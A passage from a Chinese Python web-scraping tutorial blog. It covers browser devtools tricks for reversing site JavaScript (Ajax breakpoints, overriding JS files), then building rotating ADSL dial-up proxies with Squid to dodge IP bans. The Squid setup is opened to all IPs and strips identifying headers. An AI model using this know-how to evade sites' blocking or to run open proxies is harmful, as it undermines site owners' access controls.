如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/k6gk9.png" alt="请求的 URL"></p><p>可以看到 URL 里面包含 <code>/api/movie</code> 这样的内容，所以我们可以在刚才的 XHR/fetch Breakpoints 面板中添加拦截规则。点击 + 号，可以看到一行 <code>Break when URL contains:</code> 的提示，意思是当 Ajax 请求的 URL 包含填写的内容时，会进入断点停止，这里可以填写 <code>/api/movie</code>，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/6fv4d.png" alt=""></p><p>这时候我们再点击翻页按钮 3，触发第 3 页的 Ajax 请求。会发现点击之后页面走到断点停下来了，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/87p3k.png" alt="断点调试模式"></p><p>格式化代码看一下，发现它停到了 Ajax 最后发送的那个时候，即底层的 <code>XMLHttpRequest</code> 的 <code>send</code> 方法，可是似乎还是找不到 Ajax 请求是怎么构造的。前面我们讲过调用栈 Call Stack，通过调用栈是可以顺着找到前序调用逻辑的，所以顺着调用栈一层层找，也可以找到构造 Ajax 请求的逻辑，最后会找到一个叫作 <code>onFetchData</code> 的方法，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/g5oyy.png" alt="找到 onFetchData 方法"></p><p>接下来切换到 <code>onFetchData</code> 方法并将代码格式化，可以看到如图所示的调用方法。</p><p><img src="https://qiniu.cuiqingcai.com/m86ld.png" alt="调用方法"></p><p>可以发现，可能使用了 <code>axios</code> 库发起了一个 Ajax 请求，还有 <code>limit</code>、<code>offset</code>、<code>token</code> 这 3 个参数，基本就能确定了，顺利找到了突破口！我们就不在此展开分析了，后文会有完整的分析实战。</p><p>因此在某些情况下，我们可以在比较容易地通过 Ajax 断点找到分析的突破口，这是一个常见的寻找 JavaScript 逆向突破口的方法。</p><p>要取消断点也很简单，只需要在 XHR/fetch Breakpoints 面板取消勾选即可，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/rtskp.png" alt="取消断点"></p><h2 id="8-改写-JavaScript-文件"><a href="#8-改写-JavaScript-文件" class="headerlink" title="8. 改写 JavaScript 文件"></a>8. 改写 JavaScript 文件</h2><p>我们知道，一个网页里面的 JavaScript 是从对应服务器上下载下来并在浏览器执行的。有时候，我们可能想要在调试的过程中对 JavaScript 做一些更改，比如说有以下需求：</p><ul>  <li>    <p>发现 JavaScript 文件中包含很多阻挠调试的代码或者无效代码、干扰代码，想要将其删除。</p>  </li>  <li>    <p>调试到某处，想要加一行 <code>console.log</code> 输出一些内容，以便观察某个变量或方法在页面加载过程中的调用情况。在某些情况下，这种方法比打断点调试更方便。</p>  </li>  <li>    <p>调试过程遇到某个局部变量或方法，想要把它赋值给 <code>window</code> 对象以便全局可以访问或调用。</p>  </li>  <li>    <p>在调试的时候，得到的某个变量中可能包含一些关键的结果，想要加一些逻辑将这些结果转发到对应的目标服务器。</p>  </li></ul><p>这时候我们可以试着在 Sources 面板中对 JavaScript 进行更改，但这种更改并不能长久生效，一旦刷新页面，更改就全都没有了。比如我们在 JavaScript 文件中写入一行 JavaScript 代码，然后保存，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/p00th.png" alt="在 JavaScript 文件中写入一行 JavaScript 代码"></p><p>这时候可以发现 JavaScript 文件上出现了一个感叹号标志，提示我们做的更改是不会保存的。这时候重新刷新页面，再看一下更改的这个文件，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/c9u43.png" alt="刷新页面后的 JavaScript 文件"></p><p>有什么方法可以修改呢？其实有一些浏览器插件可以实现，比如 ReRes。在插件中，我们可以添加自定义的 JavaScript 文件，并配置 URL 映射规则，这样浏览器在加载某个在线 JavaScript 文件的时候就可以将内容替换成自定义的 JavaScript 文件了。另外，还有一些代理服务器也可以实现，比如 Charles、Fiddler，借助它们可以在加载 JavaScript 文件时修改对应 URL 的响应内容，以实现对 JavaScript 文件的修改。</p><p>其实浏览器的开发者工具已经原生支持这个功能了，即浏览器的 Overrides 功能，它在 Sources 面板左侧，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/vfz28.png" alt="Overrides 功能"></p><p>我们可以在 Overrides 面板上选定一个本地的文件夹，用于保存需要更改的 JavaScript 文件，我们来实际操作一下。</p><p>首先，根据上文设置 Ajax 断点的方法，找到对应的构造 Ajax 请求的位置，根据一些网页开发知识，我们可以大体判断出 <code>then</code> 后面的回调方法接收的参数 <code>a</code> 中就包含了 Ajax 请求的结果，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/1nbk1.png" alt=""></p><p>我们打算在 Ajax 请求成功获得 Response 的时候，在控制台输出 Response 的结果，也就是通过 <code>console.log</code> 输出变量 <code>a</code>。</p><p>再切回 Overrides 面板，点击 + 按钮，这时候浏览器会提示我们选择一个本地文件夹，用于存储要替换的 JavaScript 文件。这里我选定了一个我任意新建的文件夹 ChromeOverrides，注意，这时候可能会遇到如图所示的提示，如果没有问题，直接点击“允许”即可。</p><p><img src="https://qiniu.cuiqingcai.com/fbyji.png" alt="弹出提示"></p><p>这时，在 Overrides 面板下就多了一个 ChromeOverrides 文件夹，用于存储所有我们想要更改的 JavaScript 文件，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/bh127.png" alt="Overrides 面板下出现 ChromeOverrides 文件夹"></p><p>我们可以看到，现在所在的 JavaScript 选项卡是 <code>chunk-19c920f8.012555a2.js:formatted</code>，代码已经被格式化了。因为格式化后的代码是无法直接在浏览器中修改的，所以为了方便，我们可以将格式化后的文件复制到文本编辑器中，然后添加一行代码，修改如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line">...</span><br><span class="line">&#125;).then((<span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'response'</span>, a) <span class="comment">// 添加一行代码</span></span><br><span class="line">  <span class="keyword">var</span> e = a.data</span><br><span class="line">  , s = e.results</span><br><span class="line">  , n = e.count;</span><br><span class="line">  t.loading = !<span class="number">1</span>,</span><br><span class="line">...</span><br></pre>      </td>    </tr>  </table></figure><p>接着把修改后的内容替换到原来的 JavaScript 文件中。这里要注意，切换到 <code>chunk-19c920f8.012555a2.js</code> 文件才能修改，直接替换 JavaScript 文件的所有内容即可，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/n987x.png" alt="替换 JavaScript 文件的所有内容"></p><p>替换完毕之后保存，这时候再切换回 Overrides 面板，就可以发现成功生成了新的 JavaScript 文件，它用于替换原有的 JavaScript 文件，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/jy0vc.png" alt="生成了新的 JavaScript 文件"></p><p>好，此时我们取消所有断点，然后刷新页面，就可以在控制台看到输出的 Reponse 结果了，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/760yf.png" alt="Reponse 结果"></p><p>正如我们所料，我们成功将变量 <code>a</code> 输出，其中的 <code>data</code> 字段就是 Ajax 的 Response 结果，证明改写 JavaScript 成功！而且刷新页面也不会丢失了。</p><p>我们还可以增加一些 JavaScript 逻辑，比如直接将变量 <code>a</code> 的结果通过 API 发送到远程服务器，并通过服务器将数据保存下来，也就完成了直接拦截 Ajax 请求并保存数据的过程了。</p><p>修改 JavaScript 文件有很多用途，此方案可以为我们进行 JavaScript 的逆向带来极大的便利。</p><h2 id="9-总结"><a href="#9-总结" class="headerlink" title="9. 总结"></a>9. 总结</h2><p>本节总结了一些浏览器开发者工具中对 JavaScript 逆向非常有帮助的功能，熟练掌握了这些功能会对后续 JavaScript 逆向分析打下坚实的基础，请大家好好研究。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
  &lt;p&gt;系列文章总目录：&lt;a href=&quot;https://cuiqingcai.com/17777.html&quot;&gt;【2022 年】Python3 爬虫学习教程&lt;/a&gt;，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 202
      
    
    </summary>
    
    
      <category term="Python" scheme="https://cuiqingcai.com/categories/Python/"/>
    
      <category term="爬虫" scheme="https://cuiqingcai.com/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://cuiqingcai.com/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="网络爬虫" scheme="https://cuiqingcai.com/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"/>
    
      <category term="2022" scheme="https://cuiqingcai.com/tags/2022/"/>
    
      <category term="Python 爬虫" scheme="https://cuiqingcai.com/tags/Python-%E7%88%AC%E8%99%AB/"/>
    
      <category term="JavaScript" scheme="https://cuiqingcai.com/tags/JavaScript/"/>
    
      <category term="逆向" scheme="https://cuiqingcai.com/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="调试" scheme="https://cuiqingcai.com/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>【2022 年】Python3 爬虫教程 - ADSL 拨号代理的使用</title>
    <link href="https://cuiqingcai.com/2022104.html"/>
    <id>https://cuiqingcai.com/2022104.html</id>
    <published>2022-03-05T01:33:45.000Z</published>
    <updated>2022-08-01T15:41:25.992Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">《Python3 网络爬虫开发实战（第二版）》<i class="fa fa-external-link-alt"></i></span>一书了，<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">点击了解详情<i class="fa fa-external-link-alt"></i></span>。</p></blockquote><p>我们在前面尝试维护过一个代理池，代理池可以挑选出许多可用代理，但是常常其稳定性不高、响应速度慢，而且这些代理通常是公共代理，可能不止一人同时使用，其 IP 被封的概率很大。另外，这些代理可能有效时间比较短，虽然代理池一直在筛选，但如果没有及时更新状态，也有可能获取到不可用的代理。</p><p>上一节我们也了解了付费代理的使用，付费代理的质量相对免费代理就会好不少，这的确已经是一个相对不错的方案了，但本节要介绍的方案可以使我们既能不断更换代理，又可以保证代理的稳定性。</p><p>在一些付费代理套餐中，大家可能会注意到有这样的一个套餐 - 独享代理或私密代理，这种其实就是用了专用服务器搭建了代理服务，相对一般的付费代理来说，其稳定性更好，速度也更快，同时 IP 可以动态变化。这种独享代理或私密代理的 IP 切换大多数都是基于 ADSL 拨号机制来实现的，一台云主机每拨号一次就可以换一个 IP，同时云主机上搭建了代理服务，我们就可以直接使用该云主机的 HTTP 代理来进行数据爬取了。</p><p>本节我们就来实际操作一下搭建 ADSL 拨号代理服务的方法。</p><h2 id="1-什么是-ADSL"><a href="#1-什么是-ADSL" class="headerlink" title="1. 什么是 ADSL"></a>1. 什么是 ADSL</h2><p>ADSL，英文全称是 Asymmetric Digital Subscriber Line，即非对称数字用户环路。它的上行和下行带宽不对称，它采用频分复用技术把普通的电话线分成了电话、上行和下行 3 个相对独立的信道，从而避免了相互之间的干扰。</p><p>ADSL 通过拨号的方式上网，拨号时需要输入 ADSL 账号和密码，每次拨号就更换一个 IP。IP 分布在多个 A 段，如果 IP 都能使用，则意味着 IP 量级可达千万。如果我们将 ADSL 主机作为代理，每隔一段时间云主机拨号就换一个 IP，这样可以有效防止 IP 被封禁。另外，由于我们是直接使用专有的云主机搭建的代理服务，所以其代理的稳定性相对更好，代理响应速度也相对更快。</p><h2 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2. 准备工作"></a>2. 准备工作</h2><p>在本节开始之前，我们需要先购买几台 ADSL 代理云主机，建议 2 台或以上。因为云主机在拨号的一瞬间服务器正在切换 IP，所以拨号之后代理是不可用的状态，所以需要 2 台及以上云主机来做负载均衡。</p><p>ADSL 代理云主机的服务商还是比较多的，个人推荐的有阿斯云、云立方等，其官网分别为：</p><ul>  <li>阿斯云：<span class="exturl" data-url="aHR0cHM6Ly9hc2l5dW4uY24v">https://asiyun.cn/<i class="fa fa-external-link-alt"></i></span></li>  <li>云立方：<span class="exturl" data-url="aHR0cHM6Ly93d3cueXVubGlmYW5nLmNuLw==">https://www.yunlifang.cn/<i class="fa fa-external-link-alt"></i></span></li></ul><p>本节案例中，我们以阿斯云为例，购买了一台电信型同时安装了 CentOS Linux 系统的云主机。</p><p>购买成功之后，我们可以在后台找到服务器的连接 IP、端口、用户名、密码，拨号所用的用户名和密码，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/x96x4.png" alt="image-20210711154649835"></p><p>然后找到远程管理面板 − 远程连接的用户名和密码，也就是 SSH 远程连接服务器的信息。比如我使用的 IP 和端口是 zhongweidx01.jsq.bz:30042，用户名是 root，命令行下输入如下内容：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">ssh root@zhongweidx01.jsq.bz -p 30042</span><br></pre>      </td>    </tr>  </table></figure><p>输入连接密码，就可以连接上远程服务器了，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/otm60.png" alt="image-20210711122126383"></p><p>登录成功之后，我们便可以开始本节的正式内容了。</p><h2 id="3-测试拨号"><a href="#3-测试拨号" class="headerlink" title="3. 测试拨号"></a>3. 测试拨号</h2><p>云主机默认已经配置了拨号相关的信息，如宽带用户名和密码等，所以我们无需额外进行配置，只需要调用相应的拨号命令即可实现拨号和 IP 地址的切换。</p><p>我们可以输入如下拨号命令来进行拨号：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">pppoe-start</span><br></pre>      </td>    </tr>  </table></figure><p>拨号命令成功运行，没有报错信息，耗时约几秒，结束之后整个主机就获得了一个有效的 IP 地址。</p><p>如果要停止拨号，可以输入如下命令：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">pppoe-stop</span><br></pre>      </td>    </tr>  </table></figure><p>运行完该命令后，网络就会断开，之前的 IP 地址也会被释放。</p><blockquote>  <p>注意：不同的云主机的拨号命令可能不同，如云立方主机的拨号命令为 <code>adsl-start</code> 和 <code>adsl-stop</code>，请以官方文档的说明为准。</p></blockquote><p>所以，如果要想切换 IP，我们只需要将上面的两个命令组合起来，先执行 <code>pppoe-stop</code>，再执行 <code>pppoe-start</code>。每次拨号，<code>ifconfig</code> 命令观察主机的 IP，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/tkgo8.png" alt="image-20210711123026267"></p><p>可以看到，这里我们执行了停止和开始拨号的命令之后，通过 <code>ifconfig</code> 命令获取的网卡信息的 IP 地址就变化了，所以我们成功实现了 IP 地址的切换。</p><p>好，那如果我们要想将这台云主机设置为可以实时变化 IP 的代理服务器的话，主要就有这几件事情：</p><ul>  <li>在云主机上运行代理服务软件，使之可以提供 HTTP 代理服务</li>  <li>实现云主机定时拨号更换 IP</li>  <li>实时获取云主机的代理 IP 和端口信息</li></ul><p>接下来我们就来完成这几部分内容吧。</p><h2 id="4-设置代理服务器"><a href="#4-设置代理服务器" class="headerlink" title="4. 设置代理服务器"></a>4. 设置代理服务器</h2><p>当前我们使用的云主机使用的是 Linux 的 CentOS 系统，目前它是无法作为一个 HTTP 代理服务器来使用的，因为该云主机上面目前并没有运行相关的代理软件。要想让该云主机提供 HTTP 代理服务，我们需要在其上面安装并运行相关的代理服务。</p><p>那什么软件能提供这种代理服务呢？目前业界比较流行的有 Squid 和 TinyProxy，配置完成之后它们会在特定端口上运行一个 HTTP 代理。知道了该云主机当前的 IP 之后，我们就能使用该云主机上 Squid 或 TinyProxy 提供的 HTTP 代理了。</p><p>这里我们以 Squid 为例来进行一下配置。</p><p>首先我们安装一下 Squid，在 CentOS 的安装命令如下：</p><figure class="highlight gml">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sudo yum -<span class="symbol">y</span> update</span><br><span class="line">yum -<span class="symbol">y</span> install squid</span><br></pre>      </td>    </tr>  </table></figure><p>运行完之后，我们便可以成功安装好 Squid 了。</p><p>如果要想启动 Squid，可以运行如下命令：</p><figure class="highlight crmsh">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">systemctl <span class="literal">start</span> squid</span><br></pre>      </td>    </tr>  </table></figure><p>如果想配置开机自动启动，可以运行如下命令：</p><figure class="highlight routeros">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">systemctl <span class="builtin-name">enable</span> squid</span><br></pre>      </td>    </tr>  </table></figure><p>Squid 成功运行之后，我们可以使用如下命令查看当前 Squid 的运行状态：</p><figure class="highlight ebnf">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="attribute">systemctl status squid</span></span><br></pre>      </td>    </tr>  </table></figure><p>如图所示，我们可以看到 Squid 就成功运行了：</p><p><img src="https://qiniu.cuiqingcai.com/76h1i.png" alt="image-20210711132337727"></p><p>默认情况下，Squid 会运行在 3128 端口，也就是相当于在云主机的 127.0.0.1:3128 上启动了代理服务，接下来我们可以来测试下 Squid 的代理效果，在该台云主机上运行 curl 命令请求 <span class="exturl" data-url="aHR0cHM6Ly9odHRwYmluLm9yZ++8jOW5tumFjee9ruS9v+eUqOS6keS4u+acuueahOS7o+eQhu+8mg==">https://httpbin.org，并配置使用云主机的代理：<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight livecodeserver">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">curl -x <span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3128</span> <span class="keyword">https</span>://httpbin.org/<span class="built_in">get</span></span><br></pre>      </td>    </tr>  </table></figure><p>这里 curl 的 -x 参数代表设置 HTTP 代理，由于这是在云主机上运行的，所以代理直接设置为了 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTozMTI444CC">http://127.0.0.1:3128。<i class="fa fa-external-link-alt"></i></span></p><p>运行完毕之后，我们再运行下 ifconfig 获取下当前云主机的 IP，运行结果如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/q9khx.png" alt="image-20210711133237708"></p><p>可以看到返回结果的 origin 字段的 IP 就和 ifconfig 获取的 IP 地址是一致的。</p><p>接下来，我们在自己本机上（非云主机）运行如下命令测试下代理的连通情况，这里 IP 就需要更换为云主机本身的 IP 了，刚才可以看到云主机当前拨号的 IP 是 106.45.104.166，所以需要运行如下命令：</p><figure class="highlight livecodeserver">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">curl -x <span class="keyword">http</span>://<span class="number">106.45</span><span class="number">.104</span><span class="number">.166</span>:<span class="number">3128</span> <span class="keyword">https</span>://httpbin.org/<span class="built_in">get</span></span><br></pre>      </td>    </tr>  </table></figure><p>然而发现并没有对应的输出结果，代理连接失败。</p><p>其实原因在于默认情况下 Squid 并没有开启允许外网访问，我们可以进行 Squid 的相关配置，如更改当前代理运行端口、允许连接的 IP，配置高匿代理等等，这些都需要修改 <code>/etc/squid/squid.conf</code> 文件。</p><p>要允许公网访问，最简单的方案就是将 <code>/etc/squid/squid.conf</code> 中的该行：</p><figure class="highlight ada">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">http_access deny <span class="keyword">all</span></span><br></pre>      </td>    </tr>  </table></figure><p>修改为：</p><figure class="highlight ada">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">http_access allow <span class="keyword">all</span></span><br></pre>      </td>    </tr>  </table></figure><p>意思是允许来自所有 IP 的请求连接。</p><p>另外还需要在配置文件的开头 acl 配置的部分添加该行内容：</p><figure class="highlight angelscript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">acl all src <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span></span><br></pre>      </td>    </tr>  </table></figure><p>另外我们还想将 Squid 配置成高度匿名代理，这样目标网站就无从通过一些参数如 X-Forwarded-For 来得知爬虫机本身的 IP 了，所以在配置文件中再添加如下配置：</p><figure class="highlight ada">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">request_header_access Via deny <span class="keyword">all</span></span><br><span class="line">request_header_access X-Forwarded-<span class="keyword">For</span> deny <span class="keyword">all</span></span><br></pre>      </td>    </tr>  </table></figure><p>另外有的云主机厂商可能默认封禁了 Squid 的 3128 端口，建议更换一个端口，比如 3328，修改改行：</p><figure class="highlight angelscript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">http_port <span class="number">3128</span></span><br></pre>      </td>    </tr>  </table></figure><p>修改为：</p><figure class="highlight angelscript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">http_port <span class="number">3328</span></span><br></pre>      </td>    </tr>  </table></figure><p>修改完配置之后保存配置文件，然后重新启动 Squid 即可：</p><figure class="highlight ebnf">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="attribute">systemctl restart squid</span></span><br></pre>      </td>    </tr>  </table></figure><p>这时候在本机上（非云主机）重新运行刚才的 curl 命令，同时更改下端口：</p><figure class="highlight livecodeserver">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">curl -x <span class="keyword">http</span>://<span class="number">106.45</span><span class="number">.104</span><span class="number">.166</span>:<span class="number">3328</span> <span class="keyword">https</span>://httpbin.org/<span class="built_in">get</span></span><br></pre>      </td>    </tr>  </table></figure><p>即可得到返回结果：</p><figure class="highlight json">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept"</span>: <span class="string">"*/*"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"curl/7.64.1"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-60ea8fc0-0701b1494e4680b95889cdb1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"106.45.104.166"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>这时候我们就可以在本机上直接使用云主机的代理了！</p><h2 id="5-动态获取-IP"><a href="#5-动态获取-IP" class="headerlink" title="5. 动态获取 IP"></a>5. 动态获取 IP</h2><p>现在我们已经可以执行命令让主机动态切换 IP 了，同时也在主机上搭建好代理服务器了，接下来我们只需要知道拨号后的 IP 就可以使用代理了。</p><p>那怎么动态获取拨号主机的 IP 呢？又怎么来维护这些代理呢？怎么保证获取到的代理一定是可用的呢？这时候我们可能想到一些问题：</p><ul>  <li>如果我们只有一台拨号云主机并设置了定时拨号的话，那么在拨号的几秒时间内，该云主机提供的代理服务是不可用的。</li>  <li>如果我们不用定时拨号的方法，而想要在爬虫端控制拨号云主机的拨号操作的话，爬虫端还需要单独的逻辑来处理拨号和重连的问题，这会带来额外的开销。</li></ul><p>综合考虑下来，一个比较好的解决方案是：</p><ul>  <li>为了不增加爬虫端的逻辑开销，爬虫端应该无需关心拨号云主机的拨号操作，我们只需要保证爬虫通过某个接口获取到的代理是可用的就行了，拨号云主机的代理的维护逻辑和爬虫是毫不相关的。</li>  <li>    <p>为了解决一台拨号云主机在拨号时代理不可用的问题，我们需要有多台云主机同时提供代理服务，我们可以将不同云主机的拨号时段错开，当一台云主机正在拨号时，我们可以用其他云主机顶替。</p>  </li>  <li>    <p>为了更加方便地维护和使用代理，我们可以像前文介绍的代理池一样把这些云主机的代理统一维护起来，所有拨号云主机的代理统一存储到一个公共的 Redis 数据库中，可以使用 Redis 的 Hash 存储方式，存好每台云主机和对应代理的映射关系。拨号云主机拨号前将自己对应的代理内容清空，拨号成功之后再将代理更新，这样 Redis 数据库中的代理就一定是实时可用的代理了。</p>  </li></ul><p>利用这种思路，我们要做的其实就有如下几点：</p><ul>  <li>配置一个可以公网访问的 Redis 数据库，每台云主机可以将自己的代理存储到对应的 Redis 数据库中，由该 Redis 数据库维护这些代理。</li>  <li>申请多台拨号云主机并按照上文所述配置好 Squid 代理服务，每台云主机设置定时拨号来更换 IP。</li>  <li>每台云主机在拨号前删除 Redis 数据库中原来的代理，拨号成功之后测试一下代理的可用性，将最新的代理更新到 Redis 数据库中即可。</li></ul><p>OK，接下来我们就来操作一下吧。</p><p>由于云主机要进行 Redis 数据库的操作，所以我们可以使用 Python 来实现，所以先在云主机上装下 Python：</p><figure class="highlight cmake">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">yum -y <span class="keyword">install</span> python3</span><br></pre>      </td>    </tr>  </table></figure><p>关于自动拨号、连接 Redis 数据库、获取本机代理、设置 Redis 数据库的操作，我已经写好了一个 Python 的包并发布到 PyPi 了，我们可以直接使用这个包来完成如上的功能，这个包叫做 adslproxy，可以在云主机上使用 pip3 来安装：</p><figure class="highlight cmake">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">pip3 <span class="keyword">install</span> adslproxy</span><br></pre>      </td>    </tr>  </table></figure><p>安装完毕之后，我们可以使用 export 命令设置下环境变量：</p><figure class="highlight routeros">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">REDIS_HOST</span>=&lt;Redis数据库的地址&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">REDIS_PORT</span>=&lt;Redis数据库的端口&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">REDIS_PASSWORD</span>=&lt;Redis数据库的密码&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PROXY_PORT</span>=&lt;拨号云主机配置的代理端口&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">DIAL_BASH</span>=&lt;拨号脚本&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">DIAL_IFNAME</span>=&lt;网卡名称&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">CLIENT_NAME</span>=&lt;云主机的唯一标识&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">DIAL_CYCLE</span>=&lt;拨号间隔&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>这里 REDIS_HOST、REDIS_PORT、REDIS_PASSWORD 就是远程 Redis 的连接信息，就不再赘述了。PROXY_PORT 就是云主机上代理服务的端口，我们已经设置为了 3328。DIAL_BASH 就是拨号的命令，即 <code>pppoe-stop;pppoe-start</code>，当然该脚本的内容不同的云主机厂商可能不同，以实际为准。DIAL_IFNAME 即拨号云主机上的网卡名称，程序可以通过获取该网卡的信息来获取当前拨号主机的 IP 地址，通过上述操作可以发现，网卡名称叫做 ppp0，当然这个名称也是以实际为准。CLIENT_NAME 就是云主机的唯一标识，用来在 Redis 中存储主机和代理的映射，因为我们有多台云主机，所以不同云主机的名称应该设置为不同的字符串，比如 adsl1、adsl2 等等。</p><p>这里我们设置如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/zfg87.png" alt="image-20210711152355780"></p><p>设置好环境变量之后，我们就可以运行 adslproxy 命令来进行拨号了，命令如下：</p><figure class="highlight autoit">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">adslproxy <span class="built_in">send</span></span><br></pre>      </td>    </tr>  </table></figure><p>运行结果如下：</p><figure class="highlight routeros">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line">2021-07-11 15:30:03.062 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:loop:90 - Starting 